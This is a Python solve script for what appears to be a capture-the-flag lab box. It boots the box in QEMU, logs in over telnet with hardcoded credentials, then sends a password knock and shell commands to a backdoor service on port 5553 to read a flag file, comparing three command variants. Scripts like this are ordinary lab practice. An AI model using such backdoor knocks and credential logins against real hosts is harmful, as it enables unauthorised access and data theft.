#!/usr/bin/env python3
"""Self-booting Box 4 knock comparison: which knock variant returns the flag?"""
import os, socket, subprocess, sys, time, pexpect
QEMU="qemu-system-i386"; IMAGE=os.environ["BOX_IMAGE_ABS"]; TP="2323"; FP="2121"; SP="5514"
SER="work/diag4-serial.log"
def log(m): print(f"[diag4] {m}",file=sys.stderr,flush=True)
def reap(): subprocess.run(["pkill","-9","-f",os.path.basename(IMAGE)],check=False)
reap(); time.sleep(1)
fwd=f"hostfwd=tcp:127.0.0.1:{TP}-:23,hostfwd=tcp:127.0.0.1:{FP}-:21,hostfwd=tcp:127.0.0.1:{SP}-:513"
box=subprocess.Popen([QEMU,"-machine","pc,graphics=off","-cpu","pentium","-m","128",
  "-drive",f"file={IMAGE},format=qcow2,if=ide,index=0,media=disk","-boot","c","-display","none",
  "-serial",f"file:{SER}","-monitor","none","-no-reboot",
  "-netdev",f"user,id=n0,restrict=on,{fwd}","-device","ne2k_pci,netdev=n0"],
  stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
try:
    dl=time.time()+600
    while time.time()<dl:
        try: socket.create_connection(("127.0.0.1",2323),timeout=3).close(); break
        except OSError: time.sleep(5)
    tn=None
    for _ in range(20):
        time.sleep(10)
        tn=pexpect.spawn("telnet 127.0.0.1 2323",encoding="latin-1",timeout=60)
        try: tn.expect(r"login:",timeout=30); break
        except Exception: tn=None
    tn.sendline("brian"); tn.expect(r"[Pp]assword:",timeout=30); tn.sendline("newriver")
    tn.expect([r"\$ ",r"% "],timeout=60)
    tn.sendline("stty -echo 2>/dev/null"); tn.expect([r"\$ ",r"% "],timeout=30)
    tn.sendline("PS1='D4> '; export PS1"); tn.expect(r"D4> ",timeout=30)
    log("foothold OK; waiting 120s for gen-flag to materialise"); time.sleep(120)
    def run(cmd,tmo=90):
        tn.sendline(cmd); tn.expect(r"D4> ",timeout=tmo); return tn.before
    F="/var/adm/.loot/flag.txt"
    variants=[
      ("A id;cat",  f"( echo wank; sleep 2; echo 'id; cat {F}'; sleep 5 ) | telnet localhost 5553 2>&1"),
      ("B catonly", f"( echo wank; sleep 2; echo 'cat {F}'; sleep 5 ) | telnet localhost 5553 2>&1"),
      ("C cat;id",  f"( echo wank; sleep 2; echo 'cat {F}; id'; sleep 5 ) | telnet localhost 5553 2>&1"),
    ]
    for label,cmd in variants:
        out=run(cmd); has="YES" if "BU{" in out else "NO"
        log(f"--- {label} : BU={has} ---")
        for l in out.splitlines():
            l=l.rstrip()
            if l and "D4>" not in l and "telnet localhost" not in l:
                print("    | "+repr(l)[:110],file=sys.stderr,flush=True)
finally:
    reap()
    if box.poll() is None: box.terminate()
